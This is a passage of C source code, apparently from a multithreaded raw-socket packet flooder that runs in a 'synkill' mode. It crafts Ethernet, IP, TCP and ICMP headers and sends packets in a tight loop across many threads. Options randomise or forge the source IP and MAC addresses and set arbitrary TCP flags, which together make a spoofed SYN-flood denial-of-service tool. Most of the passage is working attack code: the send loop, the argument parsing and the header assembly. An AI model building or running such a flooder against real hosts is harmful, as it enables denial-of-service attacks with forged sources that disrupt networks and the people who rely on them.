if(epfd<0)epet=0;
r=0;
waitf(&smutex,0);
while(running){
	if(r>=0&&epet)goto noerr;
	if(check_mode!=CHECK_NO){
		if(!(r2=checksockfd(fd,epfd,&r0)))goto noerr;
		if(r2>0){
			if(!epet||r2==1)++aar->aborted;
		}else if(r0!=EINTR||running)++aar->nerror;
		else goto no_show_err;
		if(lasterr!=r0&&(r0=newerr(r0))){
			r1=sprintf(inputp,"\n%ld: %s before writing %lu th packet:%s (same errors following will be hidden)\n",id,r2>0?"error avoided":"cannot check",aar->sent,strerror(r0));
			write(STDERR_FILENO,inputp,r1);
			lasterr=errno;
		}
		if(epet&&r2&2)goto noerr;
no_show_err:
			continue;
	}
noerr:
	if(!update_ok||r>=0)proc_all(sbuf,arg);
	r=write(fd,sbuf,packlen);
	++aar->sent;
	if(r<0){
		r0=errno;
		++aar->nerror;
		if((r0==ENETDOWN||r0==ENETUNREACH)&&running){
			pthread_mutex_lock(&gmutex);
			if(r0==ENETDOWN)r1=sprintf(inputp,"\n%ld: ENETDOWN at writing %lu th packet (%lu times),sleep\n",id,aar->sent,++nnetdown);
			else r1=sprintf(inputp,"\n%ld: ENETUNREACH at writing %lu th packet (%lu times),sleep\n",id,aar->sent,++nnetunreach);
			write(STDERR_FILENO,inputp,r1);
			pthread_mutex_unlock(&gmutex);
			nanosleep(&cts,NULL);
			goto noerr;
		}

//		if((r0!=EWOULDBLOCK&&r0!=EAGAIN)||!epet){
		if(lasterr!=r0&&(r0=newerr(r0))){
			r1=sprintf(inputp,"\n%ld: error at writing %lu th packet:%s (same errors following will be hidden)\n",id,aar->sent,strerror(r0));
			write(STDERR_FILENO,inputp,r1);
			lasterr=errno;
		}
//	}else --sent;
	}
	else {
	++aar->sent_ok;
	aar->sent_size+=r;
	//fprintf(stderr,"%hu\n",icmp_seqc);
	}
	if(sleep_between_sents){
		clock_gettime(CLOCK_REALTIME,&ts_new);
			ts_use.tv_sec=ts_new.tv_sec-ts_old.tv_sec;
			if(ts_new.tv_nsec<ts_old.tv_nsec){
				ts_use.tv_nsec=1000000000l+ts_new.tv_nsec-ts_old.tv_nsec;
				--ts_use.tv_sec;
			}//carry
			else ts_use.tv_nsec=ts_new.tv_nsec-ts_old.tv_nsec;
		if(ts_use.tv_sec>ts.tv_sec||(ts_use.tv_sec==ts.tv_sec&&ts_use.tv_nsec>ts.tv_nsec))
		{
			clock_gettime(CLOCK_REALTIME,&ts_old);
		}else {
		ts_use.tv_sec=ts.tv_sec-ts_use.tv_sec;
		if(ts.tv_nsec<ts_use.tv_nsec){
			ts_use.tv_nsec=1000000000l+ts.tv_nsec-ts_use.tv_nsec;
			--ts_use.tv_sec;
		}else  ts_use.tv_nsec=ts.tv_nsec-ts_use.tv_nsec;
		nanosleep(&ts_use,NULL);
		clock_gettime(CLOCK_REALTIME,&ts_old);
		}
	}
	if(count){
		if(count_written){
		if(aar->sent_ok>=count)break;
		}else {
		if(aar->sent>=count)break;
		}

	}
}

if(epfd>=0){
	epoll_ctl(epfd,EPOLL_CTL_DEL,fd,NULL);
	close(epfd);
}
close(fd);
pthread_mutex_lock(&gmutex);
free(sbuf);
pthread_mutex_unlock(&gmutex);
return 0;
err4:
if(epfd>=0)close(epfd);
err3:
pthread_mutex_lock(&gmutex);
free(sbuf);
pthread_mutex_unlock(&gmutex);
err2:
close(fd);
err1:
//usleep(1000);
//pthread_mutex_unlock(&gmutex);
return 1;
}

int prewriting(void *arg){
	int r;
	//char buf[32];
	r=writing(arg);
	if(r==0)
	((struct argandret *)arg)->end=1;
	else{
	pthread_mutex_lock(&gmutex);
	//sprintf(buf,"%ld: Failed\n",((struct argandret *)arg)->id);
	//write(STDERR_FILENO,buf,strlen(buf));
	((struct argandret *)arg)->end=2;
	++rthreads;
	pthread_mutex_unlock(&gmutex);
	}
	((struct argandret *)arg)->mutex=1;
	wakef(&((struct argandret *)arg)->mutex,1);
	return r;
}
void end_all_sleeping(void){
	long r1;
	pthread_mutex_lock(&gmutex);
	for(r1=0;r1<nthreads;++r1){
		if(targ[r1].id!=-1&&targ[r1].end==0)
			tgkill(pid,targ[r1].tid,SIGUSR1);
	}
	pthread_mutex_unlock(&gmutex);
}

uint32_t read_packet_mutex;
int read_packet(void *arg){
	union {
		struct sockaddr a;
		struct sockaddr_in in;
		struct sockaddr_ll ll;
	} uaddr;
	struct epoll_event ev;
	char inputp[INPUT_SIZE];
	ssize_t r,rcvd=0;
	int fd,epfd,r0,r1;
	memset(&uaddr,0,sizeof(uaddr));
	fd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	if(fd<0){
		r0=errno;
		r1=sprintf(inputp,"read_packet: SOCK_RAW:%s\n",strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		goto err1;
	}
	uaddr.ll.sll_family=AF_PACKET;
	uaddr.ll.sll_protocol=htons(ETH_P_ALL);
	uaddr.ll.sll_ifindex=0;
	if(bind_device){
		r0=ifname2index(fd,bind_device);
		if(r0<0){
		r1=sprintf(inputp,"read_packet: cannot find device (%s):%s \n",bind_device,strerror(-r0));
		write(STDERR_FILENO,inputp,r1);
		goto err2;
		}

	uaddr.ll.sll_ifindex=r0;
	}
	uaddr.ll.sll_hatype=ARPHRD_NETROM;
	uaddr.ll.sll_pkttype=PACKET_HOST;
	uaddr.ll.sll_halen=0;

//	if(bind_device){
	if(bind(fd,(struct sockaddr *)&uaddr,sizeof(uaddr.ll))<0){
//	if((r0=newerr(errno))){
	r1=sprintf(inputp,"read_packet: cannot bind :%s (same errors following will be hidden)\n",strerror(r0));
	write(STDERR_FILENO,inputp,r1);
//	}
	goto err2;
	}
//	}
	fcntl(fd,F_SETFL,fcntl(fd,F_GETFL)|O_NONBLOCK);

	epfd=epoll_create(1);
	if(epfd<0){
		r0=errno;
		r1=sprintf(inputp,"read_packet: cannot create epoll:%s\n",strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		goto err2;
	}
	ev.events=EPOLLIN|EPOLLET;
	ev.data.u64=0;
	if(epoll_ctl(epfd,EPOLL_CTL_ADD,fd,&ev)<0){
		r0=errno;
		r1=sprintf(inputp,"read_packet: cannot ctl epoll:%s\n",strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		goto err3;

	}

	while(running){
		if((r1=checksockfd(fd,epfd,&r0))<0){
		if(r0==EINTR||!running){exit(0);break;}
		r1=sprintf(inputp,"\nread_packet: cannot %s :%s \n",r1>0?"read":"epoll",strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		continue;
		}
		while((r=read(fd,inputp,sizeof(inputp)))>0){
			r1=sprintf(inputp,"read %ld th size:%ld\n",++rcvd,r);
			write(STDERR_FILENO,inputp,r1);

		}
	}
	epoll_ctl(epfd,EPOLL_CTL_DEL,fd,NULL);
	close(epfd);
	close(fd);
	return 0;
err3:
	close(epfd);
err2:
	close(fd);
err1:
	return -1;
}
uint32_t read_stdin_mutex;
int read_stdin(void *arg){
	ssize_t r;
	long r1,r2,r3,r0;
	char *p;
	char *saveptr;
	fd_set fds;
	*lastcmd=0;
	for(;;){
		FD_ZERO(&fds);
		FD_SET(STDIN_FILENO,&fds);
		if(select(STDIN_FILENO+1,&fds,NULL,NULL,NULL)<0){
			
			break;
		}
		if(!FD_ISSET(STDIN_FILENO,&fds))break;
		r=read(STDIN_FILENO,input,INPUT_SIZE);
		if(r==0){
end:
			running=0;
			end_all_sleeping();
			break;
		}
		else if(r<0)break;
		p=memchr(input,'\n',r);
		if(p)*p=0;
		else continue;
redo_cmd:
		if(p==input){
			strcpy(input,lastcmd);
		}else strcpy(lastcmd,input);
		strtok_r(input," ",&saveptr);
		if(strcmp(input,"end")==0||strcmp(input,"quit")==0||strcmp(input,"q")==0||strcmp(input,"exit")==0){
			goto end;
		}else if(strcmp(input,"err")==0||strcmp(input,"error")==0||strcmp(input,"e")==0){
			pthread_mutex_lock(&gmutex);
			nhidden_errors=0;
			pthread_mutex_unlock(&gmutex);
			continue;
		}else if(strcmp(input,"t")==0||strcmp(input,"thread")==0||strcmp(input,"threads")==0){
//		pthread_mutex_lock(&gmutex);
		r0=r2=r3=0;
		for(r1=0;r1<nthreads;++r1){
			if(targ[r1].id==-1){
				++r2;
				continue;
			}
			if(targ[r1].end==1)++r3;
			else if(targ[r1].end==2)++r2;
			else if(targ[r1].end==0)++r0;
		}
		//	pthread_mutex_unlock(&gmutex);
			sprintf(input2,"read_stdin: %ld thread%s active. %ld done. %ld failed.\n",r0,r0==1?" is":"s are",r3,r2);
			write(STDERR_FILENO,input2,strlen(input2));
			continue;
		}else if(strcmp(input,"y")==0||strcmp(input,"redo")==0){
			p=input;
			goto redo_cmd;
		}else if(strcmp(input,"kill")==0||strcmp(input,"k")==0){
			p=strtok_r(NULL," ",&saveptr);
			if(p){
			r1=sscanf(p,"%ld",&r2);
			if(r1<1)goto inarg;
			}
			else r2=SIGKILL;
			kill(pid,r2);
			continue;
		}else if(strcmp(input,"alarm")==0||strcmp(input,"alrm")==0){
			p=strtok_r(NULL," ",&saveptr);
			if(p){
			r1=sscanf(p,"%ld",&r2);
			if(r1<1)goto inarg;
			}
			else r2=0;
			alarm(r2);
			continue;
		}else if(strcmp(input,"echo2")==0){
			p=strtok_r(NULL," ",&saveptr);
			if(p){
				strcpy(input,lastcmd);
				p[r=strlen(p)]='\n';
				p[r+1]=0;
				write(STDERR_FILENO,p,strlen(p));
			}
			else goto noarg;
			continue;
		}else if(strcmp(input,"echo")==0||strcmp(input,"echo1")==0){
				p=strtok_r(NULL," ",&saveptr);
			if(p){
				strcpy(input,lastcmd);
				p[r=strlen(p)]='\n';
				p[r+1]=0;
				write(STDOUT_FILENO,p,strlen(p));
			}
			else goto noarg;
			continue;
		}else {
			sprintf(input2,"read_stdin: invaild command:\"%s\"\n",input);
			write(STDERR_FILENO,input2,strlen(input2));
			continue;
noarg:
			sprintf(input2,"read_stdin: no (enough) argument with \"%s\"\n",input);
			write(STDERR_FILENO,input2,strlen(input2));
			continue;
inarg:
			sprintf(input2,"read_stdin: invaild argument with \"%s\"\n",input);
			write(STDERR_FILENO,input2,strlen(input2));
			continue;


		}
	}
	read_stdin_mutex=1;
	wakef(&read_stdin_mutex,1);
	//fprintf(stderr,"\n%d/%d:end\n",getpid(),gettid());
	//select(0,NULL,NULL,NULL,NULL);
	return 0;
}

void psig(int sig){
	switch(sig){
		case SIGINT:
			running=0;
			//fprintf(stderr,"\nSIGINT\n");
			//++intcount;
			//printf("%ld\n",intcount);
			//if(intcount>1)signal(SIGINT,SIG_DFL);
			end_all_sleeping();
			break;
		case SIGABRT:
			//fprintf(stderr,"\nSIGABRT\n");
			running=0;
			break;
		case SIGALRM:
			//fprintf(stderr,"\nSIGALRM\n");
			running=0;
			break;
		case SIGUSR1:
			//running=0;
			//fprintf(stderr,"\n%d/%d:SIGUSR1\n",getpid(),gettid());
			break;
		default:
			break;
	}
}
int main(int argc,char **argv){
	signed long int i,r0,r1,r2;
	off_t foff;
	enum __proto proto;
	ssize_t r;
	int fd;
	struct in_addr iptmp;
	char **argv0;
	srand(time(NULL));
	dat2spec("2.0",&cts);
	argv0=argv;
#ifdef RELEASE
	if(strcmp(bfname(argv[0]),"synkill")==0)
#else
	if(strcmp(bfname(argv[0]),"synkill_g")==0||strcmp(bfname(argv[0]),"synkill")==0)
#endif
	{
		synkill_args[0]=argv[0];
		argv=synkill_args;
		goto main_arg;
after_synkill_arg:
		argv=argv0;
		goto main_arg;
	}
	if(argc<2){
		write(STDOUT_FILENO,"--help\n",7);
		return 0;
	}
main_arg:
	for(i=1;argv[i];++i){
		if(strcmp(argv[i],"--mac-dst")==0||strcmp(argv[i],"--eth-dst")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			if(ether_aton_r(argv[++i],(struct ether_addr *)mac_t)==NULL)goto err_sarg;
			mac_t_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--mac-src")==0||strcmp(argv[i],"--eth-src")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			if(ether_aton_r(argv[++i],(struct ether_addr *)mac_s)==NULL)goto err_sarg;
			mac_s_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--mac-src-rand")==0||strcmp(argv[i],"--eth-src-rand")==0){
			mac_srcmode=RAND;
			mac_s_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--help")==0){
			write(STDOUT_FILENO,"see help.txt\n",13);
			return 0;
		}else if(strcmp(argv[i],"--license")==0){
			write(STDOUT_FILENO,license,sizeof(license)-1);
			return 0;
		}else if(strcmp(argv[i],"--icmp")==0){
			upper_proto=P_ICMP;
		}else if(strcmp(argv[i],"--icmp-seq-rand")==0){
			icmp_seqmode=RAND;
		}else if(strcmp(argv[i],"--icmp-seq-fix")==0){
			icmp_seqmode=FIX;
		}else if(strcmp(argv[i],"--icmp-seq-inc")==0){
			icmp_seqmode=INC;
		}else if(strcmp(argv[i],"--icmp-seq-dec")==0){
			icmp_seqmode=DEC;
		}else if(strcmp(argv[i],"--icmp-seq")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hu",&icmp_seq0);
			if(r0<1)goto err_sarg;
			icmp_seq_fillrand=0;
		}else if(strcmp(argv[i],"--icmp-id-inc")==0){
			icmp_idmode=INC;
		}else if(strcmp(argv[i],"--icmp-id-dec")==0){
			icmp_idmode=DEC;
		}else if(strcmp(argv[i],"--icmp-id-fix")==0){
			icmp_idmode=FIX;
		}else if(strcmp(argv[i],"--icmp-id-rand")==0){
			icmp_idmode=RAND;
		}else if(strcmp(argv[i],"--icmp-id")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hu",&icmp_echoid);
			if(r0<1)goto err_sarg;
			icmp_id_fillrand=0;
		}else if(strcmp(argv[i],"--icmp-sock-raw")==0){
			icmp_sock_type=TYPE_RAW;
		}else if(strcmp(argv[i],"--icmp-sock-dgram")==0){
			icmp_sock_type=TYPE_DGRAM;
		}else if(strcmp(argv[i],"--icmp-sock-auto")==0){
			icmp_sock_type=TYPE_AUTO;
		}else if(strcmp(argv[i],"--icmp-echo")==0){
			icmp_type=ICMP_ECHO;
		}else if(strcmp(argv[i],"--icmp-reply")==0){
			icmp_type=ICMP_ECHOREPLY;
		}else if(strcmp(argv[i],"--udp")==0){
			upper_proto=P_UDP;
		}else if(strcmp(argv[i],"--packet")==0||strcmp(argv[i],"-P")==0){
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"-p")==0||strcmp(argv[i],"--port")==0||strcmp(argv[i],"--dst-port")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hu",&port_t);
			if(r0<1)goto err_sarg;
			port_dst_fillrand=0;
		}else if(strcmp(argv[i],"--src-port")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hu",&port_s);
			if(r0<1)goto err_sarg;
			port_src_fillrand=0;
			port_srcmode=FIX;
		}else if(strcmp(argv[i],"--dst-port-rand")==0){
			port_dstmode=RAND;
		}else if(strcmp(argv[i],"--dst-port-inc")==0){
			port_dstmode=INC;
		}else if(strcmp(argv[i],"--dst-port-dec")==0){
			port_dstmode=DEC;
		}else if(strcmp(argv[i],"--dst-port-fix")==0){
			port_dstmode=FIX;
		}else if(strcmp(argv[i],"--src-port-rand")==0){
			port_srcmode=RAND;
		}else if(strcmp(argv[i],"--src-port-inc")==0){
			port_srcmode=INC;
		}else if(strcmp(argv[i],"--src-port-dec")==0){
			port_srcmode=DEC;
		}else if(strcmp(argv[i],"--src-port-fix")==0){
			port_srcmode=FIX;
		}else if(strcmp(argv[i],"--tcp-flag")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			tcp_flag=argv[++i];
			upper_proto=P_TCP;base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--tcp")==0){
			upper_proto=P_TCP;base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--tcp-seq-rand")==0){
			tcp_seqmode=RAND;
		}else if(strcmp(argv[i],"--tcp-seq-inc")==0){
			tcp_seqmode=INC;
		}else if(strcmp(argv[i],"--tcp-seq-dec")==0){
			tcp_seqmode=DEC;
		}else if(strcmp(argv[i],"--tcp-seq-fix")==0){
			tcp_seqmode=FIX;
		}else if(strcmp(argv[i],"--tcp-seq")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%u",&tcp_seq);
			if(r0<1)goto err_sarg;
			tcp_seq_fillrand=0;
			tcp_seqmode=FIX;
		}else if(strcmp(argv[i],"--tcp-window-rand")==0){
			tcp_windowmode=RAND;
		}else if(strcmp(argv[i],"--tcp-window-inc")==0){
			tcp_windowmode=INC;
		}else if(strcmp(argv[i],"--tcp-window-dec")==0){
			tcp_windowmode=DEC;
		}else if(strcmp(argv[i],"--tcp-window-fix")==0){
			tcp_windowmode=FIX;
		}else if(strcmp(argv[i],"--tcp-window")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hu",&tcp_window);
			if(r0<1)goto err_sarg;
			tcp_windowmode=FIX;
		}else if(strcmp(argv[i],"--raw")==0){
			base_proto=P_RAW;
		}else if(strcmp(argv[i],"--update-force")==0){
			update_ok=0;
		}else if(strcmp(argv[i],"--update-ok")==0){
			update_ok=1;
		}else if(strcmp(argv[i],"--check")==0||strcmp(argv[i],"--check-auto")==0){
			check_mode=CHECK_AUTO;
		}else if(strcmp(argv[i],"--check-select")==0){
			check_mode=CHECK_SELECT;
		}else if(strcmp(argv[i],"--check-epoll")==0){
			check_mode=CHECK_EPOLL;
		}else if(strcmp(argv[i],"-et")==0||strcmp(argv[i],"-ET")==0||strcmp(argv[i],"--check-epollet")==0){
			check_mode=CHECK_EPOLL;
			epet=1;
		}else if(strcmp(argv[i],"--check-no")==0){
			check_mode=CHECK_NO;
		}else if(strcmp(argv[i],"--recv")==0){
			recv_pack=1;
		}else if(strcmp(argv[i],"-s")==0||strcmp(argv[i],"--source")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			source=argv[++i];
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"-s-rand")==0||strcmp(argv[i],"--source-rand")==0){
			mac_srcmode=RAND;
			mac_s_c=1;
			ip_srcmode=RAND;
			ip_addr_s_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"-t")==0||strcmp(argv[i],"--target")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			target=argv[++i];
		}else if(strcmp(argv[i],"-i")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			bind_device=argv[++i];
		}else if(strcmp(argv[i],"--ip")==0){
			base_proto=P_ETHER;
			upper_proto=P_IP;
		}else if(strcmp(argv[i],"--ip-dst")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=inet_aton(argv[++i],&ip_addr_t);
			if(r0<1)goto err_sarg;
			ip_addr_t_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--ip-src")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=inet_aton(argv[++i],&ip_addr_s);
			if(r0<1)goto err_sarg;
			ip_addr_s_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--ip-src-rand")==0){
			ip_srcmode=RAND;
			ip_addr_s_c=1;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--ip-id-inc")==0){
			ip_idmode=INC;
		}else if(strcmp(argv[i],"--ip-id-dec")==0){
			ip_idmode=DEC;
		}else if(strcmp(argv[i],"--ip-id-fix")==0){
			ip_idmode=FIX;
		}else if(strcmp(argv[i],"--ip-id-rand")==0){
			ip_idmode=RAND;
		}else if(strcmp(argv[i],"--ip-id")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hu",&ip_id);
			if(r0<1)goto err_sarg;
			ip_id_fillrand=0;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"--ip-subnet")==0){
			ip_randmask=1;
		}else if(strcmp(argv[i],"--ip-ttl")==0||strcmp(argv[i],"-TTL")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%hhu",&ip_ttl);
			if(r0<1)goto err_sarg;
			base_proto=P_ETHER;
		}else if(strcmp(argv[i],"-cw")==0||strcmp(argv[i],"--count-written")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}			
			r0=sscanf(argv[++i],"%lu",&count);
			if(r0<1)goto err_sarg;
			count_written=1;
		}else if(strcmp(argv[i],"-c")==0||strcmp(argv[i],"--count")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%lu",&count);
			if(r0<1)goto err_sarg;
			count_written=0;
		}else if(strcmp(argv[i],"--timeout")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=dat2spec(argv[++i],&cts);
			if(r0<1)goto err_sarg;
			//ctv.tv_sec=cts_tv_sec;
			//ctv.tv_usec=cts_tv_nsec/1000;
			ctout=cts.tv_sec*1000000+cts.tv_nsec/1000;
			pcts=&cts;
			//pctv=&ctv;
		} else if(strcmp(argv[i],"--thread")==0||strcmp(argv[i],"-T")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%ld",&nthreads);
			if(r0<1)goto err_sarg;
		}else if(strcmp(argv[i],"--alarm")==0||strcmp(argv[i],"--alrm")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%u",&do_alarm);
			if(r0<1)goto err_sarg;
		}else if(strcmp(argv[i],"--size")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%zu",&data_size);
			if(r0<1)goto err_sarg;
		}else if(strcmp(argv[i],"--sendbuf")==0||strcmp(argv[i],"--sndbuf")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			r0=sscanf(argv[++i],"%zu",&sndbuf);
			if(r0<1)goto err_sarg;
		}else if(strcmp(argv[i],"--data")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			data_from_file=argv[++i];
		}else if(strcmp(argv[i],"--sleep")==0){
			if(!argv[i+1]){
				fprintf(stderr,"no argument after %s\n",argv[i]);
				errexit("Failed\n");
			}
			sleep_between_sents=1;
			r0=dat2spec(argv[++i],&ts);
			if(r0<1)goto err_sarg;
		}else if(argv[i][0]!='-'){
			target=argv[i];
		}else{
err_sarg:
			fprintf(stderr,"invaild argument:%s (after %s)\n",argv[i],argv[i-1]);
			errexit("Failed\n");
		}
	}
	if(argv==synkill_args)goto after_synkill_arg;
//	if(epet==1)check_mode=CHECK_EPOLL;
	//arg processing completed
	pid=getpid();
	signal(SIGUSR1,psig);
	//signal(SIGABRT,psig);

	if(do_alarm)alarm(do_alarm);

	running=1;
	if(recv_pack)read_packet(NULL);
	if(check_mode==CHECK_NONE)check_mode=CHECK_NO;
	if(target!=NULL){
		fprintf(stderr,"target (%s)\n",target);
	if(inet_aton(target,&ip_addr_t)==0){
		errexit("invaild target\nFailed\n");
	}
	}
	else if(base_proto!=P_RAW&&base_proto!=P_ETHER)errexit("no target\nFailed\n");
	if((base_proto==P_ETHER||base_proto==P_RAW)){
	if(bind_device)strcpy(ifname,bind_device);
	else{
		fprintf(stderr,"cannot select device automatically"/* (%s)*/",specify with -i\n"/*,fd<0?strerror(-fd):(target?"No arp cache":"No target")*/);
		errexit("Failed\n");
	}
	if(!ip_addr_t_c){
		if(!target){
		fprintf(stderr,"cannot get target ip automatically on (%s),specify with -t or --ip-dst\n",ifname);
		errexit("Failed\n");
	}else if(inet_aton(target,&ip_addr_t)==0){
		errexit("invaild target\nFailed\n");
		}
	}

	if(!mac_t_c){
		if(!target){
			fd=0;
		}
		else if(inet_aton(target,&iptmp)==0){
		errexit("invaild target\nFailed\n");
		return -1;
		}else fd=ip2mac(ifname,&iptmp,mac_t);
		if(fd<1){
			fprintf(stderr,"cannot get dest mac automatically on (%s) (%s),specify with --mac-dst\n",bind_device?bind_device:ifname,fd<0?strerror(-fd):(target?"No arp cache":"No target"));
			errexit("Failed\n");
		}else {
			ether_ntoa_r((struct ether_addr *)mac_t,input1);
			fprintf(stderr,"target mac (%s)\n",input1);
		}
	
	}
	if(!ip_addr_s_c){
			if(source){
			if(inet_aton(source,&ip_addr_s)==0){
			errexit("invaild source\nFailed\n");
			}
			}else if(localip(ifname,&ip_addr_s)<1){
			fprintf(stderr,"cannot get source ip automatically on (%s) (%s),specify with -s or --ip-src\n",ifname,fd<0?strerror(-fd):"???");
			errexit("Failed\n");
			}
			inet_ntop(AF_INET,&ip_addr_s,input1,INPUT_SIZE);
			fprintf(stderr,"source ip (%s)\n",input1);

	}
	if(!mac_s_c){
		if(source){
		if(inet_aton(source,&iptmp)==0){
		errexit("invaild source\nFailed\n");
			}
		fd=ip2mac(ifname,&iptmp,mac_s);
		}else fd=localmac(ifname,mac_s);
		if(fd<1){
			fprintf(stderr,"cannot get source mac automatically on (%s) (%s),specify with --mac-src\n",ifname,fd<0?strerror(-fd):"No arp cache");
			errexit("Failed\n");
		}else {
			ether_ntoa_r((struct ether_addr *)mac_s,input1);
			fprintf(stderr,"source mac (%s)\n",input1);
		}
	
	}
		fprintf(stderr,"on (%s)\n",ifname);
	if(ip_randmask){
		if(localnetmask(ifname,&ip_mask)<0){
			fprintf(stderr,"cannot get netmask :%s\n",strerror(errno));
			errexit("Failed\n");
		}
		memcpy(&ip_masknot,&ip_mask,sizeof(struct in_addr));
		memnot(&ip_masknot,sizeof(struct in_addr));
		if(localip(ifname,&ip_supernet)<0){
			fprintf(stderr,"cannot get local ip :%s\n",strerror(errno));
			errexit("Failed\n");
		}
		memand(&ip_supernet,&ip_mask,sizeof(struct in_addr));
	}
	}
	i=0;
	if(upper_proto==P_NONE)upper_proto=P_ICMP;
	if(base_proto==P_NONE)base_proto=upper_proto;
	proto=base_proto;
	packlen=0;
	while(proto!=P_NONE){
	switch(proto){
		case P_ICMP:
			fhdr[i]=fill_icmphdr;
			phdr[i]=process_icmphdr;
			packlen+=sizeof(struct icmphdr);
			++i;
			ip_protocol=IPPROTO_ICMP;
			proto=P_NONE;
			break;
		case P_UDP:
			if(base_proto==P_UDP){
				proto=P_NONE;
				break;
			}
			break;
		case P_RAW:
			proto=P_NONE;
			break;
		case P_ETHER:
			fhdr[i]=fill_ethhdr;
			phdr[i]=process_ethhdr;
			packlen+=sizeof(struct ethhdr);
			++i;
			if(upper_proto==P_ETHER){
				proto=P_NONE;
				break;
			}
			proto=P_IP;
			break;
		case P_IP:
			fhdr[i]=fill_iphdr;
			phdr[i]=process_iphdr;
			packlen+=sizeof(struct iphdr);
			++i;
			if(upper_proto==P_IP){
				proto=P_NONE;
				break;
			}
			eth_protocol=ETH_P_IP;
			switch(upper_proto){
//				case P_ICMP:
//					proto=P_ICMP;
//					break;
//				case P_TCP:
//					proto=P_TCP;
//					break;
				default:
					proto=upper_proto;
					break;
			}
			break;
		case P_TCP:
			fhdr[i]=fill_tcphdr;
			phdr[i]=process_tcphdr;
			packlen+=sizeof(struct tcphdr);
			++i;
			ip_protocol=IPPROTO_TCP;
			proto=P_NONE;
			break;
		default:
			errexit("unknown protocol\nFailed\n");
	}
}
	phdr[i]=NULL;
	fhdr[i]=NULL;
	tstack=malloc(nthreads*TSTACK_SIZE+nthreads*sizeof(*targ));
	if(tstack==NULL){
	perror("cannot malloc");
	goto err0;
	}
//malloced
	targ=(struct argandret *)((char *)tstack+nthreads*TSTACK_SIZE);
/*	targ=malloc(nthreads*sizeof(*targ));
	if(targ==NULL){
	perror("cannot malloc");
	goto err1;
	}*/
//malloced
	if(data_from_file){
		fd=open(data_from_file,O_RDONLY);
		if(fd<0){
			fprintf(stderr,"cannot open \"%s\":%s\n",data_from_file,strerror(errno));
			goto err2;
		}
		if(data_size==0){
			foff=lseek(fd,0,SEEK_END);
			if(foff==ERR_LSEEK){
cannot_reseek:
				perror("cannot seek file");
				close(fd);
				goto err2;
			}
			if(lseek(fd,0,SEEK_SET)==ERR_LSEEK)goto cannot_reseek;
			else data_size=foff;
		}
		if(data_size>0){
		data_from_file=malloc(data_size);
		if(data_from_file==NULL){
			close(fd);
			perror("cannot malloc");
			goto err2;
			}
		//malloced
		memset(data_from_file,0,data_size);
		r=read(fd,data_from_file,data_size);
